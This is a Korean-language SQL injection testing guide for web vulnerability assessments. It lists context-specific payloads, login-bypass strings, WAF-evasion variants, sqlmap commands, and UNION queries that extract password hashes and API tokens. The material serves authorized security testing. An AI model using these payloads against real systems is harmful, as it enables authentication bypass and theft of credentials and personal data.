---
sidebar_position: 11
title: SQL Injection
description: 웹 진단 - SQL Injection 컨텍스트 판단, 응답 비교, 페이로드, 우회 노트
keywords: [SQL Injection, SQLi, Error-based, Boolean, Time-based, Union-based, 입력값 검증, OWASP A05]
draft: false
---

# SQL 인젝션 (SQL Injection)

## 점검 목적

사용자 입력값이 SQL Query에 안전하게 바인딩되지 않은 채 들어가 쿼리 구조를 변경할 수 있는지 확인. 성공 시 인증 우회, 권한 없는 데이터 조회, 데이터 변조, 내부 정보 노출이 가능함. 운영 환경에서는 가용성 이슈를 피하기 위해 지연 payload와 대량 조회를 최소 범위로 제한.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **Error-based** | DB 오류 메시지가 응답에 노출 | DBMS, 쿼리 일부, 컬럼명, 함수명 노출 여부 확인 |
| **Union-based** | `UNION SELECT` 결과가 화면/API 응답에 섞여 나옴 | 컬럼 수, 출력 위치, 데이터 타입이 맞아야 함 |
| **Boolean-based Blind** | True/False 조건에 따라 응답 내용이 달라짐 | status보다 row 수, 메시지, JSON 값, 응답 길이 차이를 봄 |
| **Time-based Blind** | 조건이 참일 때 응답 시간이 지연됨 | baseline 대비 반복적으로 지연되는지 확인 |
| **Second-Order** | 저장된 값이 다른 화면/배치/관리자 기능에서 쿼리에 사용됨 | 입력 화면이 아니라 조회/처리 시점까지 따라가야 함 |
| **OOB** | DNS/HTTP 같은 외부 요청으로 확인 | 운영 진단에서는 사전 협의 없으면 사용하지 않음 |

---

## 진단 절차

### Step 1. 진입점 식별

DB 조회 조건, 정렬 조건, 저장 후 재조회되는 값부터 우선 본다.

- URL 파라미터: `?id=1`, `?seq=100`, `?category=notice`
- 검색/필터: `q`, `keyword`, `searchText`, `startDate`, `endDate`
- 정렬/페이징: `sort`, `order`, `orderBy`, `page`, `limit`, `offset`
- 로그인/인증: `id`, `userId`, `loginId`, `password`, `pw`
- JSON body: `{ "id": 1 }`, `{ "keyword": "test" }`
- Cookie/Header: `lang`, `tenant`, `X-Forwarded-For`, `User-Agent`
- 저장값: 회원명, 부서명, 게시글 제목, 파일명, 관리자 메모

### Step 2. SQLi 진단 루틴

Burp Repeater에서 baseline을 먼저 고정한 뒤, **오류 유발 → True/False 비교 → 지연 비교 → 컨텍스트 전환** 순서로 좁힌다.

**1. 오류 유발**

```text
'
"
\
`
)
'))
';
```

**2. Boolean 비교**

```text
' AND '1'='1
' AND '1'='2
' OR '1'='1
' OR '1'='2
```

숫자형처럼 보이는 파라미터는 quote 없이도 같이 본다.

```text
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 OR 1=2
```

**3. Time 비교**

```sql
' AND SLEEP(3)-- -
' AND pg_sleep(3)-- -
'; WAITFOR DELAY '0:0:3'-- -
```

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| DB 오류 메시지 노출 | Error-based 후보 | DBMS 문자열, 컬럼/테이블명, SQL syntax 위치 확인 |
| `1=1`은 정상, `1=2`는 빈 목록 | Boolean-based 가능성 높음 | 응답 길이, row 수, `totalCount`, 메시지를 비교 |
| status는 같고 JSON 값만 다름 | API Blind 후보 | 바뀌는 필드만 고정해서 반복 확인 |
| `SLEEP(3)`에서만 3초 이상 지연 | Time-based 후보 | 같은 요청을 3회 반복해 baseline 편차와 분리 |
| 특수문자만 500, 논리식 차이 없음 | 단순 예외 가능성 | DB 오류 signature 또는 다른 컨텍스트로 재시도 |
| WAF/필터 응답으로 차단 | 입력 전처리 또는 WAF | 인코딩, 주석, 대소문자, 연산자 우회 확인 |
| 파라미터가 서버 응답에 영향 없음 | 미사용 파라미터 가능성 | 실제 요청 body, hidden parameter, 다른 API 확인 |

### Step 3. 컨텍스트별 빠른 선택

먼저 파라미터가 SQL에서 어떤 자리에 들어갈지 가정하고 payload를 고른다.

| 입력 컨텍스트 | 먼저 넣을 payload | 볼 것 |
| :--- | :--- | :--- |
| 숫자형 조건: `id=1` | `1 AND 1=1`, `1 AND 1=2` | 상세 데이터 존재/미존재, 권한 오류와 구분 |
| 문자열 조건: `name=test` | `test' AND '1'='1`, `test' AND '1'='2` | 검색 결과 수, 빈 목록, DB 오류 |
| 검색/LIKE: `q=test` | `test%' AND '1'='1`, `test%' AND '1'='2` | wildcard 반영, 전체/부분 검색 결과 차이 |
| 로그인 ID | `admin'-- -`, `admin' OR '1'='1'-- -` | 뒤의 password 조건이 주석 처리되는지 |
| 로그인 PW | `test' OR '1'='1`, `test') OR ('1'='1` | ID 고정 상태에서 인증 성공 여부 |
| 정렬: `sort=name` | `sort=name desc`, `sort=1` | 서버 정렬 반영, SQL 오류, allowlist 여부 |
| 페이징: `limit=10` | `limit=1`, `limit=10 OFFSET 0` | row 수 변화, 문법 오류 |
| JSON 값 | `{"id":"1 AND 1=1"}`, `{"id":1}` | 문자열/숫자 타입 강제 여부 |
| Cookie/Header | `'`, `')`, `' AND '1'='1` | 즉시 응답보다 로그/관리자 화면 영향 |

### Step 4. DBMS 식별

오류 메시지, 함수명, 지연 함수 반응으로 DBMS를 좁힌다.

| DBMS | 오류/버전 확인 | 지연 확인 |
| :--- | :--- | :--- |
| MySQL/MariaDB | `@@version`, `version()`, `database()` | `SLEEP(3)` |
| PostgreSQL | `version()`, `current_database()` | `pg_sleep(3)` |
| MSSQL | `@@version`, `DB_NAME()` | `WAITFOR DELAY '0:0:3'` |
| Oracle | `banner FROM v$version`, `USER` | `DBMS_LOCK.SLEEP(3)` |
| SQLite | `sqlite_version()` | 별도 sleep 함수가 없는 경우가 많음 |

### Step 5. 영향 확인

취약 확정에는 “대량 추출”보다 **최소 증거**가 좋다.

- Boolean: 같은 요청에서 True/False 조건만 바꿨을 때 응답이 안정적으로 갈리는지 확인
- Error: 오류 메시지에 DBMS/쿼리/컬럼 정보가 노출되는지 확인
- Union: 임의 상수값이 화면이나 JSON 응답에 출력되는지 확인
- Time: baseline 대비 지연이 반복적으로 재현되는지 확인
- 인증 우회: 정상 비밀번호 없이 특정 계정 세션이 발급되는지 확인
- Stored/Second-Order: 저장한 값이 다른 기능에서 SQL 오류나 조건 변화로 이어지는지 확인

---

## 페이로드 노트

아래 payload는 컨텍스트가 어느 정도 잡혔을 때 사용한다. 운영 환경에서는 지연 시간은 짧게, 반복 횟수는 필요한 만큼만 잡는다.

### 숫자형 / 문자열 조건

숫자형 파라미터는 quote 없는 payload를 먼저 본다.

```sql
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 OR 1=2
1 AND 2>1
1 AND 2<1
```

문자열 파라미터는 quote를 닫고 조건식을 붙인다.

```sql
test' AND '1'='1
test' AND '1'='2
test' OR '1'='1
test' OR '1'='2
test') AND ('1'='1
test') AND ('1'='2
```

응답이 빈 목록으로 바뀌는지, `totalCount`, `pageInfo`, `message`, `data.length`가 달라지는지 본다.

### 검색 / LIKE 컨텍스트

검색어는 보통 `LIKE '%<INPUT>%'` 형태라 wildcard와 quote 위치가 중요하다.

```sql
test%' AND '1'='1
test%' AND '1'='2
%' AND '1'='1
%' AND '1'='2
test%' OR '1'='1
```

검색 결과가 너무 많아지면 오탐처럼 보일 수 있다. baseline 검색어를 고정하고 조건식만 바꿔 비교한다.

### 정렬 / ORDER BY 컨텍스트

`sort`, `order`, `orderBy`는 보통 `ORDER BY <INPUT>` 자리에 들어간다. quote payload보다 먼저 **서버 정렬이 실제로 바뀌는지**와 **SQL expression이 실행되는지**를 본다.

| 단계 | 요청 값 | 확인 의도 | 판단 |
| :--- | :--- | :--- | :--- |
| 기본 정렬 | `sort=name` | 파라미터가 정렬에 쓰이는지 확인 | 이름순으로 바뀌면 서버 정렬 가능성 |
| 역방향 정렬 | `sort=name desc` | 정렬 방향이 그대로 반영되는지 확인 | 역순 정렬되면 입력값이 `ORDER BY`에 가까움 |
| 컬럼 순번 | `sort=1`, `sort=1 desc` | `ORDER BY 1` 형태 허용 여부 확인 | 정렬 변화 또는 SQL 오류 확인 |
| 조건식 | `sort=case when 1=1 then name else id end` | SQL expression 실행 여부 확인 | `name` 기준 정렬 |
| 조건식 반전 | `sort=case when 1=2 then name else id end` | True/False에 따른 정렬 차이 확인 | `id` 기준 정렬 |

`name`, `id`는 예시다. 실제 화면에 있는 `title`, `seq`, `createdAt` 같은 정렬 가능 컬럼으로 바꿔서 본다. 프론트 정렬, 서버 allowlist 정렬, DB 정렬을 구분하려면 같은 요청을 Raw response 기준으로 비교한다.

### JSON Body 컨텍스트

JSON은 먼저 서버가 타입을 강제하는지 본다. 숫자 필드가 문자열도 받으면 SQL 조건식이 문자열로 전달될 여지가 있다.

```json
{"id":1}
{"id":"1"}
{"id":"1 AND 1=1"}
{"id":"1 AND 1=2"}
```

검색 API처럼 문자열 필드가 SQL 조건에 들어가는 경우에는 일반 문자열 조건과 동일하게 본다.

```json
{"keyword":"test' AND '1'='1"}
{"keyword":"test' AND '1'='2"}
```

JSON 파싱 단계에서 막히는 오류와 DB Query 단계에서 나는 오류를 구분한다. `400 Bad Request`만 나오면 SQLi보다 타입/스키마 검증에 걸렸을 가능성이 높다.

### 로그인 우회

로그인은 어느 파라미터 뒤에 `AND password = ...`가 붙는지 먼저 가정한다.

```sql
admin'-- -
admin' #
admin'/*
admin' OR '1'='1'-- -
' OR '1'='1'-- -
```

앞쪽 ID 파라미터가 실패하면 뒤쪽 password 파라미터를 본다.

```http
POST /api/login HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

id=admin&pw=test' OR '1'='1
```

공백, `=`, quote가 필터링되거나 form encoding에서 깨지면 URL 인코딩으로 재시도한다.

```text
id=admin&pw=test'+OR+'1'%3d'1
id=admin&pw=test%27%20OR%20%271%27%3d%271
```

판정은 “로그인 성공”만 보지 말고 세션 발급, 사용자 식별값, 권한 화면 접근까지 확인한다.

### Error-based

오류가 응답에 노출될 때만 사용한다. DBMS가 다르면 함수가 바로 달라진다.

```sql
-- MySQL/MariaDB
' AND extractvalue(1, concat(0x7e, version()))-- -
' AND updatexml(1, concat(0x7e, database()), 1)-- -

-- PostgreSQL
' AND CAST(version() AS int)-- -
' AND CAST(current_database() AS int)-- -

-- MSSQL
' AND 1=CONVERT(int, @@version)-- -

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
```

오류 메시지가 화면에 그대로 나오면 취약 확정에 가깝다. 운영에서는 오류 기반으로 DB명/버전 정도만 확인하고 멈추는 편이 안전하다.

### Union-based

화면이나 API 응답에 쿼리 결과가 출력될 때만 유효하다.

```sql
-- 컬럼 수 확인
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- 출력 위치 확인
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -

-- 최소 정보 확인
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,user(),3-- -
```

컬럼 수가 맞아도 데이터 타입이 안 맞으면 실패한다. 숫자/문자/날짜 컬럼이 섞인 화면에서는 `NULL`로 맞춘 뒤 출력 위치에만 문자열을 넣는다.

### Boolean-based Blind

응답 내용이 달라지는 필드를 먼저 정한다.

```sql
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))>100-- -
' AND LENGTH(database())>5-- -
```

API에서는 아래 항목을 비교한다.

```text
HTTP status
Content-Length
data 배열 개수
totalCount / count
success / resultCode
message
redirect 여부
```

캐시가 섞이면 같은 payload를 반복해도 응답이 흔들린다. `Cache-Control: no-cache`를 붙이거나 의미 없는 파라미터를 추가해 baseline을 다시 잡는다.

### Time-based Blind

내용 차이가 없을 때 마지막에 본다. 지연은 짧게 시작하고 baseline 편차가 크면 판단하지 않는다.

```sql
-- MySQL/MariaDB
' AND IF(1=1, SLEEP(3), 0)-- -
' AND IF(1=2, SLEEP(3), 0)-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
'; SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -
'; IF (1=2) WAITFOR DELAY '0:0:3'-- -
```

판정은 한 번의 지연이 아니라 **True 지연 / False 비지연 / baseline 정상** 조합이 반복될 때 한다.

### Second-Order / 저장값

저장 요청에서 아무 반응이 없어도, 저장값이 다른 기능의 SQL 조건으로 재사용될 수 있다.

```http
POST /api/profile/update HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"department":"sales'","nickname":"test"}
```

확인은 저장 직후가 아니라 조회/검색/관리자/엑셀 다운로드/배치 처리 경로까지 본다.

```http
GET /api/admin/users?department=sales HTTP/1.1
Host: <TARGET>

GET /api/users/export?format=xlsx HTTP/1.1
Host: <TARGET>
```

---

## 필터 / WAF 우회 매트릭스

무작정 payload를 늘리지 말고, 차단되는 문자와 변형되는 위치를 먼저 본다.

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| 공백 차단 | 주석, tab, newline | `/**/OR/**/1=1`, `%09OR%091=1`, `%0aOR%0a1=1` |
| quote 차단 | 숫자형 조건, hex, 함수 | `1 AND 1=1`, `0x61646d696e` |
| `AND` / `OR` 차단 | 연산자 대체, 대소문자 | `&&`, `OR` 연산자 대체, `AnD`, `oR` |
| `UNION` / `SELECT` 차단 | 주석 삽입, 대소문자 | `UN/**/ION SEL/**/ECT`, `UnIoN SeLeCt` |
| `=` 차단 | `LIKE`, `IN`, 비교 연산 | `'a' LIKE 'a'`, `1 IN (1)`, `2>1` |
| `--` 차단 | 다른 주석, 괄호 닫기 | `#`, `/*`, `') OR ('1'='1` |
| URL decoding 이슈 | 한 번/두 번 인코딩 비교 | `%27`, `%2527`, `%20`, `+` |
| JSON 타입 검증 | 문자열/숫자 타입 전환 | `"id":"1 OR 1=1"`, `"id":1` |

### 우회 payload 예시

```sql
'/**/OR/**/'1'='1
'%09OR%09'1'='1
'%0aOR%0a'1'='1
' OR 'a' LIKE 'a
' OR 1 IN (1)
' OR 2>1
1 AND (SELECT 1)=1
1 AND 0x61=0x61
```

---

## sqlmap 참고

실무 운영 점검에서는 고객사 가용성 문제와 점검자가 세부 동작을 통제하기 어려운 이슈 때문에 sqlmap을 기본 사용하지 않는다. 이 문서에서는 랩 환경이나 사전 승인된 제한 검증에서 참고하는 정도로만 둔다.

사용하더라도 Burp 요청 파일 기준으로 대상 파라미터와 기법을 좁힌다.

```bash
sqlmap -r request.txt -p id --batch --technique=BE --current-db
sqlmap -r request.txt -p keyword --batch --technique=B --string="검색 결과"
sqlmap -r request.txt -p id --batch --technique=T --time-sec=3
```

아래 옵션은 운영 환경에서는 특히 주의한다.

```bash
--risk=3
--level=5
--dump
--os-shell
--threads
```

자동화 결과는 최종 판정 근거가 아니라 수동 재현을 돕는 참고 자료로만 본다.

---

## 취약 판정 기준

다음 중 하나라도 안정적으로 재현되면 취약으로 본다.

- [ ] 입력값으로 SQL syntax 오류 또는 DBMS 오류 메시지를 유발할 수 있음
- [ ] True/False 조건만 바꿨을 때 응답 내용, row 수, JSON 필드, redirect가 명확히 달라짐
- [ ] 지연 조건이 참일 때만 baseline 대비 일정 시간 이상 늦어짐
- [ ] `UNION SELECT`로 임의 상수값이나 최소 DB 정보가 응답에 출력됨
- [ ] 로그인 우회로 정상 비밀번호 없이 세션이 발급됨
- [ ] 저장된 payload가 다른 기능에서 SQL 오류나 조건 변화를 유발함

다음은 후보 또는 보류로 둔다.

- [ ] 특수문자 하나로만 500 오류가 나고 논리식 차이가 없음
- [ ] 응답 차이가 캐시, 권한, rate limit, A/B 테스트와 구분되지 않음
- [ ] 파라미터가 서버 쿼리에 쓰이는지 확인되지 않음
- [ ] Time-based 지연이 네트워크 편차와 구분되지 않음

영향도가 올라가는 조건:

- [ ] 인증 우회 또는 타 사용자 데이터 접근 가능
- [ ] 관리자/운영자 기능에서 재현 가능
- [ ] 검색/목록 API에서 권한 없는 테이블성 데이터가 노출됨
- [ ] Second-Order로 저장값이 관리자 기능, 다운로드, 배치에서 실행됨

---

## 블라인드 모의해킹 확장

취약점 진단에서는 오류, Boolean, Time, Union 상수 출력처럼 최소 PoC로 멈추지만, 블라인드 모의해킹에서는 **DB 권한과 실제 접근 가능 데이터 범위**를 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. DB 컨텍스트 | 현재 DB명, DB 사용자, DBMS 종류 | `database()`, `user()`, 버전 일부 |
| 2. 권한 범위 | 접근 가능한 스키마/테이블 목록 | 테이블명 3~5개, 전체 count |
| 3. 민감 데이터 접근 | 사용자/주문/권한/토큰 테이블 조회 가능 여부 | 원문/해시/토큰 샘플, row count |
| 4. 권한 확장 | 쓰기, 파일 접근, DB 계정 권한, OS 연계 가능성 | 테스트 변경 또는 영향 낮은 증거 |

### DB 컨텍스트 확인

Union 출력이 가능한 경우에는 현재 DB와 계정 정도만 먼저 확인한다.

```sql
' UNION SELECT NULL,database(),user()-- -
' UNION SELECT NULL,version(),NULL-- -
```

Blind만 가능한 경우에는 길이/존재 여부 위주로 본다.

```sql
' AND LENGTH(database())>0-- -
' AND ASCII(SUBSTRING(database(),1,1))>64-- -
```

### 스키마 / 테이블 범위 확인

MySQL/MariaDB 기준 예시다. DBMS가 다르면 catalog 뷰를 바꿔서 같은 의도로 확인한다.

```sql
' UNION SELECT NULL,table_name,NULL
  FROM information_schema.tables
  WHERE table_schema=database()
  LIMIT 5-- -
```

컬럼 확인은 민감 테이블이 의심될 때만 제한적으로 본다.

```sql
' UNION SELECT NULL,column_name,NULL
  FROM information_schema.columns
  WHERE table_name='users'
  LIMIT 5-- -
```

### 데이터 샘플 확인

데이터 접근 가능성은 실제 샘플로 입증한다. 비밀번호 해시, API token, 개인정보 컬럼도 조회 대상이 될 수 있다.

```sql
' UNION SELECT NULL,CONCAT(id,':',email),NULL
  FROM users
  LIMIT 3-- -
```

민감 컬럼 접근 가능성을 보여야 할 때는 샘플 수를 제한한다.

```sql
' UNION SELECT NULL,CONCAT(id,':',password_hash),NULL
  FROM users
  LIMIT 3-- -

' UNION SELECT NULL,CONCAT(user_id,':',api_token),NULL
  FROM api_tokens
  LIMIT 3-- -
```

컬럼명이 다르면 실제 스키마에 맞춰 바꾼다. 대량 조회 전에는 count와 제한 샘플로 먼저 데이터 성격을 확인한다.

### 쓰기 가능성 확인

쓰기 가능성은 실제 영향으로 확인한다. 우선순위는 테스트 레코드, 영향 낮은 실데이터, 운영 데이터 순이다.

```text
테스트 계정의 표시명 변경
테스트 게시글 제목 변경
임시 테이블/임시 row 생성
```

운영 데이터 `UPDATE`는 복구 가능성과 영향 범위를 확인한 뒤 진행한다. DB에서 파일 쓰기나 OS 명령 실행으로 확장 가능한 단서가 보이면 다음 단계로 이어서 확인한다.

---

## 참고자료

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap 공식 문서](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
